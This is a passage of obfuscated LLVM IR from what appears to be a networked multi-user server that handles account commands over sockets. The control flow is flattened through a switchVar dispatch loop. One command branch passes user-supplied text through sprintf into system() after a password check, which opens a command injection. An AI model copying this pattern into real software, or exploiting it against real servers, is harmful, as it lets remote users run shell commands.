  %1474 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i32 0, i32 0
  %1475 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i32 0, i32 0
  %1476 = call i64 @strlen(i8* %1475) #8
  %1477 = call i64 @send(i32 %1473, i8* %1474, i64 %1476, i32 16384)
  %1478 = icmp eq i64 %1477, -1
  %1479 = select i1 %1478, i32 -1802326297, i32 1665422042
  store i32 %1479, i32* %switchVar
  br label %loopEnd

; <label>:1480:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1481:                                   ; preds = %loopEntry
  %1482 = load i32, i32* %4, align 4
  %1483 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i32 0, i32 0
  %1484 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i32 0, i32 0
  %1485 = call i64 @strlen(i8* %1484) #8
  %1486 = call i64 @send(i32 %1482, i8* %1483, i64 %1485, i32 16384)
  %1487 = icmp eq i64 %1486, -1
  %1488 = select i1 %1487, i32 567716480, i32 1918511505
  store i32 %1488, i32* %switchVar
  br label %loopEnd

; <label>:1489:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1490:                                   ; preds = %loopEntry
  %1491 = load i8*, i8** %3, align 8
  %1492 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1491) #7
  store i32 -19291786, i32* %switchVar
  br label %loopEnd

; <label>:1493:                                   ; preds = %loopEntry
  %1494 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1495 = load i32, i32* %5, align 4
  %1496 = sext i32 %1495 to i64
  %1497 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1496
  %1498 = getelementptr inbounds %struct.account, %struct.account* %1497, i32 0, i32 0
  %1499 = getelementptr inbounds [20 x i8], [20 x i8]* %1498, i32 0, i32 0
  %1500 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1501 = call i32 (i8*, i8*, ...) @sprintf(i8* %1494, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %1499, i8* %1500) #7
  %1502 = load i32, i32* %4, align 4
  %1503 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1504 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1505 = call i64 @strlen(i8* %1504) #8
  %1506 = call i64 @send(i32 %1502, i8* %1503, i64 %1505, i32 16384)
  %1507 = icmp eq i64 %1506, -1
  %1508 = select i1 %1507, i32 -1751194803, i32 1566752106
  store i32 %1508, i32* %switchVar
  br label %loopEnd

; <label>:1509:                                   ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1510:                                   ; preds = %loopEntry
  store i32 -798784803, i32* %switchVar
  br label %loopEnd

; <label>:1511:                                   ; preds = %loopEntry
  store i32 473462240, i32* %switchVar
  br label %loopEnd

; <label>:1512:                                   ; preds = %loopEntry
  %1513 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1514 = call i8* @strstr(i8* %1513, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.122, i32 0, i32 0)) #8
  %1515 = icmp ne i8* %1514, null
  %1516 = select i1 %1515, i32 1962936628, i32 -203689271
  store i32 %1516, i32* %switchVar
  br label %loopEnd

; <label>:1517:                                   ; preds = %loopEntry
  %1518 = load i32, i32* %5, align 4
  %1519 = sext i32 %1518 to i64
  %1520 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1519
  %1521 = getelementptr inbounds %struct.account, %struct.account* %1520, i32 0, i32 0
  %1522 = getelementptr inbounds [20 x i8], [20 x i8]* %1521, i32 0, i32 0
  %1523 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1524 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %1522, i8* %1523)
  %1525 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %1525, %struct._IO_FILE** %98, align 8
  %1526 = load %struct._IO_FILE*, %struct._IO_FILE** %98, align 8
  %1527 = load i32, i32* %5, align 4
  %1528 = sext i32 %1527 to i64
  %1529 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1528
  %1530 = getelementptr inbounds %struct.account, %struct.account* %1529, i32 0, i32 0
  %1531 = getelementptr inbounds [20 x i8], [20 x i8]* %1530, i32 0, i32 0
  %1532 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1533 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1526, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %1531, i8* %1532)
  %1534 = load %struct._IO_FILE*, %struct._IO_FILE** %98, align 8
  %1535 = call i32 @fclose(%struct._IO_FILE* %1534)
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1536:                                   ; preds = %loopEntry
  %1537 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1538 = call i8* @strstr(i8* %1537, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0)) #8
  %1539 = icmp ne i8* %1538, null
  %1540 = select i1 %1539, i32 1208443472, i32 -1454743660
  store i32 %1540, i32* %switchVar
  br label %loopEnd

; <label>:1541:                                   ; preds = %loopEntry
  %1542 = load i32, i32* %5, align 4
  %1543 = sext i32 %1542 to i64
  %1544 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1543
  %1545 = getelementptr inbounds %struct.account, %struct.account* %1544, i32 0, i32 0
  %1546 = getelementptr inbounds [20 x i8], [20 x i8]* %1545, i32 0, i32 0
  %1547 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1548 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %1546, i8* %1547)
  %1549 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %1549, %struct._IO_FILE** %99, align 8
  %1550 = load %struct._IO_FILE*, %struct._IO_FILE** %99, align 8
  %1551 = load i32, i32* %5, align 4
  %1552 = sext i32 %1551 to i64
  %1553 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1552
  %1554 = getelementptr inbounds %struct.account, %struct.account* %1553, i32 0, i32 0
  %1555 = getelementptr inbounds [20 x i8], [20 x i8]* %1554, i32 0, i32 0
  %1556 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1557 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1550, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %1555, i8* %1556)
  %1558 = load %struct._IO_FILE*, %struct._IO_FILE** %99, align 8
  %1559 = call i32 @fclose(%struct._IO_FILE* %1558)
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1560:                                   ; preds = %loopEntry
  %1561 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1562 = call i8* @strstr(i8* %1561, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.126, i32 0, i32 0)) #8
  %1563 = icmp ne i8* %1562, null
  %1564 = select i1 %1563, i32 -919983572, i32 -959796743
  store i32 %1564, i32* %switchVar
  br label %loopEnd

; <label>:1565:                                   ; preds = %loopEntry
  %1566 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1567 = call i8* @strstr(i8* %1566, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.127, i32 0, i32 0)) #8
  %1568 = icmp ne i8* %1567, null
  %1569 = select i1 %1568, i32 -919983572, i32 1757807460
  store i32 %1569, i32* %switchVar
  br label %loopEnd

; <label>:1570:                                   ; preds = %loopEntry
  %1571 = load i32, i32* %5, align 4
  %1572 = sext i32 %1571 to i64
  %1573 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1572
  %1574 = getelementptr inbounds %struct.account, %struct.account* %1573, i32 0, i32 0
  %1575 = getelementptr inbounds [20 x i8], [20 x i8]* %1574, i32 0, i32 0
  %1576 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1577 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.128, i32 0, i32 0), i8* %1575, i8* %1576)
  %1578 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %1578, %struct._IO_FILE** %100, align 8
  %1579 = load %struct._IO_FILE*, %struct._IO_FILE** %100, align 8
  %1580 = load i32, i32* %5, align 4
  %1581 = sext i32 %1580 to i64
  %1582 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1581
  %1583 = getelementptr inbounds %struct.account, %struct.account* %1582, i32 0, i32 0
  %1584 = getelementptr inbounds [20 x i8], [20 x i8]* %1583, i32 0, i32 0
  %1585 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1586 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1579, i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.130, i32 0, i32 0), i8* %1584, i8* %1585)
  %1587 = load %struct._IO_FILE*, %struct._IO_FILE** %100, align 8
  %1588 = call i32 @fclose(%struct._IO_FILE* %1587)
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:1589:                                   ; preds = %loopEntry
  %1590 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1591 = call i8* @strstr(i8* %1590, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.131, i32 0, i32 0)) #8
  %1592 = icmp ne i8* %1591, null
  %1593 = select i1 %1592, i32 1956754802, i32 1355952716
  store i32 %1593, i32* %switchVar
  br label %loopEnd

; <label>:1594:                                   ; preds = %loopEntry
  %1595 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1596 = call i8* @strstr(i8* %1595, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.132, i32 0, i32 0)) #8
  %1597 = icmp ne i8* %1596, null
  %1598 = select i1 %1597, i32 1956754802, i32 -880870660
  store i32 %1598, i32* %switchVar
  br label %loopEnd

; <label>:1599:                                   ; preds = %loopEntry
  %1600 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1601 = call i32 (i8*, i8*, ...) @sprintf(i8* %1600, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.133, i32 0, i32 0)) #7
  %1602 = load i32, i32* %4, align 4
  %1603 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1604 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1605 = call i64 @strlen(i8* %1604) #8
  %1606 = call i64 @send(i32 %1602, i8* %1603, i64 %1605, i32 16384)
  %1607 = icmp eq i64 %1606, -1
  %1608 = select i1 %1607, i32 209007499, i32 283170383
  store i32 %1608, i32* %switchVar
  br label %loopEnd

; <label>:1609:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1610:                                   ; preds = %loopEntry
  store i32 -880870660, i32* %switchVar
  br label %loopEnd

; <label>:1611:                                   ; preds = %loopEntry
  %1612 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1613 = call i8* @strstr(i8* %1612, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.134, i32 0, i32 0)) #8
  %1614 = icmp ne i8* %1613, null
  %1615 = select i1 %1614, i32 660118659, i32 -1326921117
  store i32 %1615, i32* %switchVar
  br label %loopEnd

; <label>:1616:                                   ; preds = %loopEntry
  %1617 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1618 = call i32 (i8*, i8*, ...) @sprintf(i8* %1617, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.135, i32 0, i32 0)) #7
  %1619 = load i32, i32* %4, align 4
  %1620 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1621 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1622 = call i64 @strlen(i8* %1621) #8
  %1623 = call i64 @send(i32 %1619, i8* %1620, i64 %1622, i32 16384)
  %1624 = icmp eq i64 %1623, -1
  %1625 = select i1 %1624, i32 1557305027, i32 1296852489
  store i32 %1625, i32* %switchVar
  br label %loopEnd

; <label>:1626:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1627:                                   ; preds = %loopEntry
  store i32 -1326921117, i32* %switchVar
  br label %loopEnd

; <label>:1628:                                   ; preds = %loopEntry
  %1629 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1630 = call i8* @strstr(i8* %1629, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.136, i32 0, i32 0)) #8
  %1631 = icmp ne i8* %1630, null
  %1632 = select i1 %1631, i32 -1299337875, i32 696572850
  store i32 %1632, i32* %switchVar
  br label %loopEnd

; <label>:1633:                                   ; preds = %loopEntry
  %1634 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1635 = call i32 (i8*, i8*, ...) @sprintf(i8* %1634, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.137, i32 0, i32 0)) #7
  %1636 = load i32, i32* %4, align 4
  %1637 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1638 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1639 = call i64 @strlen(i8* %1638) #8
  %1640 = call i64 @send(i32 %1636, i8* %1637, i64 %1639, i32 16384)
  %1641 = icmp eq i64 %1640, -1
  %1642 = select i1 %1641, i32 -853353690, i32 1904445667
  store i32 %1642, i32* %switchVar
  br label %loopEnd

; <label>:1643:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1644:                                   ; preds = %loopEntry
  store i32 696572850, i32* %switchVar
  br label %loopEnd

; <label>:1645:                                   ; preds = %loopEntry
  %1646 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1647 = call i8* @strstr(i8* %1646, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.138, i32 0, i32 0)) #8
  %1648 = icmp ne i8* %1647, null
  %1649 = select i1 %1648, i32 -1216891555, i32 706889866
  store i32 %1649, i32* %switchVar
  br label %loopEnd

; <label>:1650:                                   ; preds = %loopEntry
  %1651 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1652 = call i8* @strstr(i8* %1651, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.139, i32 0, i32 0)) #8
  %1653 = icmp ne i8* %1652, null
  %1654 = select i1 %1653, i32 -1216891555, i32 -1624940563
  store i32 %1654, i32* %switchVar
  br label %loopEnd

; <label>:1655:                                   ; preds = %loopEntry
  %1656 = load i8*, i8** %12, align 8
  %1657 = load i32, i32* %5, align 4
  %1658 = sext i32 %1657 to i64
  %1659 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1658
  %1660 = getelementptr inbounds %struct.account, %struct.account* %1659, i32 0, i32 2
  %1661 = getelementptr inbounds [20 x i8], [20 x i8]* %1660, i32 0, i32 0
  %1662 = call i32 @strcmp(i8* %1656, i8* %1661) #8
  %1663 = icmp eq i32 %1662, 0
  %1664 = select i1 %1663, i32 -212645745, i32 1093322975
  store i32 %1664, i32* %switchVar
  br label %loopEnd

; <label>:1665:                                   ; preds = %loopEntry
  %1666 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1667 = call i8* @strtok(i8* %1666, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0)) #7
  store i8* %1667, i8** %102, align 8
  %1668 = load i8*, i8** %102, align 8
  %1669 = getelementptr inbounds i8, i8* %1668, i64 8
  store i8* %1669, i8** %103, align 8
  %1670 = load i8*, i8** %103, align 8
  call void @trim(i8* %1670)
  %1671 = load i8*, i8** %103, align 8
  %1672 = getelementptr inbounds [100 x i8*], [100 x i8*]* %101, i32 0, i32 0
  %1673 = call i32 (i8*, i8**, ...) bitcast (i32 (...)* @resolve to i32 (i8*, i8**, ...)*)(i8* %1671, i8** %1672)
  %1674 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1675 = load i8*, i8** %103, align 8
  %1676 = getelementptr inbounds [100 x i8*], [100 x i8*]* %101, i32 0, i32 0
  %1677 = call i32 (i8*, i8*, ...) @sprintf(i8* %1674, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.141, i32 0, i32 0), i8* %1675, i8** %1676) #7
  %1678 = load i32, i32* %4, align 4
  %1679 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1680 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1681 = call i64 @strlen(i8* %1680) #8
  %1682 = call i64 @send(i32 %1678, i8* %1679, i64 %1681, i32 16384)
  %1683 = icmp eq i64 %1682, -1
  %1684 = select i1 %1683, i32 -1429368156, i32 785591821
  store i32 %1684, i32* %switchVar
  br label %loopEnd

; <label>:1685:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1686:                                   ; preds = %loopEntry
  store i32 1877994796, i32* %switchVar
  br label %loopEnd

; <label>:1687:                                   ; preds = %loopEntry
  %1688 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1689 = call i32 (i8*, i8*, ...) @sprintf(i8* %1688, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.142, i32 0, i32 0)) #7
  %1690 = load i32, i32* %4, align 4
  %1691 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1692 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1693 = call i64 @strlen(i8* %1692) #8
  %1694 = call i64 @send(i32 %1690, i8* %1691, i64 %1693, i32 16384)
  %1695 = icmp eq i64 %1694, -1
  %1696 = select i1 %1695, i32 1707530648, i32 -1828084290
  store i32 %1696, i32* %switchVar
  br label %loopEnd

; <label>:1697:                                   ; preds = %loopEntry
  store i32 -1828084290, i32* %switchVar
  br label %loopEnd

; <label>:1698:                                   ; preds = %loopEntry
  store i32 1877994796, i32* %switchVar
  br label %loopEnd

; <label>:1699:                                   ; preds = %loopEntry
  store i32 -1624940563, i32* %switchVar
  br label %loopEnd

; <label>:1700:                                   ; preds = %loopEntry
  %1701 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1702 = call i8* @strstr(i8* %1701, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.143, i32 0, i32 0)) #8
  %1703 = icmp ne i8* %1702, null
  %1704 = select i1 %1703, i32 -1164025036, i32 -794128762
  store i32 %1704, i32* %switchVar
  br label %loopEnd

; <label>:1705:                                   ; preds = %loopEntry
  %1706 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1707 = call i8* @strstr(i8* %1706, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.144, i32 0, i32 0)) #8
  %1708 = icmp ne i8* %1707, null
  %1709 = select i1 %1708, i32 -1164025036, i32 -2109651127
  store i32 %1709, i32* %switchVar
  br label %loopEnd

; <label>:1710:                                   ; preds = %loopEntry
  %1711 = load i8*, i8** %12, align 8
  %1712 = load i32, i32* %5, align 4
  %1713 = sext i32 %1712 to i64
  %1714 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1713
  %1715 = getelementptr inbounds %struct.account, %struct.account* %1714, i32 0, i32 2
  %1716 = getelementptr inbounds [20 x i8], [20 x i8]* %1715, i32 0, i32 0
  %1717 = call i32 @strcmp(i8* %1711, i8* %1716) #8
  %1718 = icmp eq i32 %1717, 0
  %1719 = select i1 %1718, i32 -593524815, i32 -1827661575
  store i32 %1719, i32* %switchVar
  br label %loopEnd

; <label>:1720:                                   ; preds = %loopEntry
  %1721 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1722 = call i8* @strtok(i8* %1721, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0)) #7
  store i8* %1722, i8** %104, align 8
  %1723 = load i8*, i8** %104, align 8
  %1724 = getelementptr inbounds i8, i8* %1723, i64 8
  store i8* %1724, i8** %105, align 8
  %1725 = load i8*, i8** %105, align 8
  call void @trim(i8* %1725)
  %1726 = getelementptr inbounds [50 x i8*], [50 x i8*]* %106, i32 0, i32 0
  %1727 = bitcast i8** %1726 to i8*
  %1728 = load i8*, i8** %105, align 8
  %1729 = call i32 (i8*, i8*, ...) @sprintf(i8* %1727, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.145, i32 0, i32 0), i8* %1728) #7
  %1730 = getelementptr inbounds [50 x i8*], [50 x i8*]* %106, i32 0, i32 0
  %1731 = bitcast i8** %1730 to i8*
  %1732 = call i32 @system(i8* %1731)
  %1733 = load i32, i32* %5, align 4
  %1734 = sext i32 %1733 to i64
  %1735 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1734
  %1736 = getelementptr inbounds %struct.account, %struct.account* %1735, i32 0, i32 0
  %1737 = getelementptr inbounds [20 x i8], [20 x i8]* %1736, i32 0, i32 0
  %1738 = load i8*, i8** %105, align 8
  %1739 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.146, i32 0, i32 0), i8* %1737, i8* %1738)
  %1740 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1741 = load i32, i32* %5, align 4
  %1742 = sext i32 %1741 to i64
  %1743 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1742
  %1744 = getelementptr inbounds %struct.account, %struct.account* %1743, i32 0, i32 0
  %1745 = getelementptr inbounds [20 x i8], [20 x i8]* %1744, i32 0, i32 0
  %1746 = load i8*, i8** %105, align 8
  %1747 = call i32 (i8*, i8*, ...) @sprintf(i8* %1740, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.147, i32 0, i32 0), i8* %1745, i8* %1746) #7
  %1748 = load i32, i32* %4, align 4
  %1749 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1750 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1751 = call i64 @strlen(i8* %1750) #8
  %1752 = call i64 @send(i32 %1748, i8* %1749, i64 %1751, i32 16384)
  %1753 = icmp eq i64 %1752, -1
  %1754 = select i1 %1753, i32 1212136781, i32 711631215
  store i32 %1754, i32* %switchVar
  br label %loopEnd

; <label>:1755:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1756:                                   ; preds = %loopEntry
  store i32 761702364, i32* %switchVar
  br label %loopEnd

; <label>:1757:                                   ; preds = %loopEntry
  %1758 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1759 = call i32 (i8*, i8*, ...) @sprintf(i8* %1758, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.142, i32 0, i32 0)) #7
  %1760 = load i32, i32* %4, align 4
  %1761 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1762 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1763 = call i64 @strlen(i8* %1762) #8
  %1764 = call i64 @send(i32 %1760, i8* %1761, i64 %1763, i32 16384)
  %1765 = icmp eq i64 %1764, -1
  %1766 = select i1 %1765, i32 760459851, i32 -1665851204
  store i32 %1766, i32* %switchVar
  br label %loopEnd

; <label>:1767:                                   ; preds = %loopEntry
  store i32 -1665851204, i32* %switchVar
  br label %loopEnd

; <label>:1768:                                   ; preds = %loopEntry
  store i32 761702364, i32* %switchVar
  br label %loopEnd

; <label>:1769:                                   ; preds = %loopEntry
  store i32 -2109651127, i32* %switchVar
  br label %loopEnd

; <label>:1770:                                   ; preds = %loopEntry
  %1771 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1772 = call i8* @strstr(i8* %1771, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.148, i32 0, i32 0)) #8
  %1773 = icmp ne i8* %1772, null
  %1774 = select i1 %1773, i32 1598547706, i32 -763863097
  store i32 %1774, i32* %switchVar
  br label %loopEnd

; <label>:1775:                                   ; preds = %loopEntry
  %1776 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1777 = call i32 (i8*, i8*, ...) @sprintf(i8* %1776, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.149, i32 0, i32 0)) #7
  %1778 = load i32, i32* %4, align 4
  %1779 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1780 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1781 = call i64 @strlen(i8* %1780) #8
  %1782 = call i64 @send(i32 %1778, i8* %1779, i64 %1781, i32 16384)
  %1783 = icmp eq i64 %1782, -1
  %1784 = select i1 %1783, i32 -1189491500, i32 1552313509
  store i32 %1784, i32* %switchVar
  br label %loopEnd

; <label>:1785:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1786:                                   ; preds = %loopEntry
  store i32 -763863097, i32* %switchVar
  br label %loopEnd

; <label>:1787:                                   ; preds = %loopEntry
  %1788 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1789 = call i8* @strstr(i8* %1788, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.150, i32 0, i32 0)) #8
  %1790 = icmp ne i8* %1789, null
  %1791 = select i1 %1790, i32 -1831644443, i32 -1161596352
  store i32 %1791, i32* %switchVar
  br label %loopEnd

; <label>:1792:                                   ; preds = %loopEntry
  %1793 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1794 = call i32 (i8*, i8*, ...) @sprintf(i8* %1793, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i32 0, i32 0)) #7
  %1795 = load i32, i32* %4, align 4
  %1796 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1797 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1798 = call i64 @strlen(i8* %1797) #8
  %1799 = call i64 @send(i32 %1795, i8* %1796, i64 %1798, i32 16384)
  %1800 = icmp eq i64 %1799, -1
  %1801 = select i1 %1800, i32 -1547293182, i32 1555259563
  store i32 %1801, i32* %switchVar
  br label %loopEnd

; <label>:1802:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1803:                                   ; preds = %loopEntry
  store i32 -1161596352, i32* %switchVar
  br label %loopEnd

; <label>:1804:                                   ; preds = %loopEntry
  %1805 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1806 = call i8* @strstr(i8* %1805, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.152, i32 0, i32 0)) #8
  %1807 = icmp ne i8* %1806, null
  %1808 = select i1 %1807, i32 -1884219602, i32 1468737716
  store i32 %1808, i32* %switchVar
  br label %loopEnd

; <label>:1809:                                   ; preds = %loopEntry
  %1810 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1811 = call i32 (i8*, i8*, ...) @sprintf(i8* %1810, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i32 0, i32 0)) #7
  %1812 = load i32, i32* %4, align 4
  %1813 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1814 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1815 = call i64 @strlen(i8* %1814) #8
  %1816 = call i64 @send(i32 %1812, i8* %1813, i64 %1815, i32 16384)
  %1817 = icmp eq i64 %1816, -1
  %1818 = select i1 %1817, i32 -120975721, i32 -1426852412
  store i32 %1818, i32* %switchVar
  br label %loopEnd

; <label>:1819:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
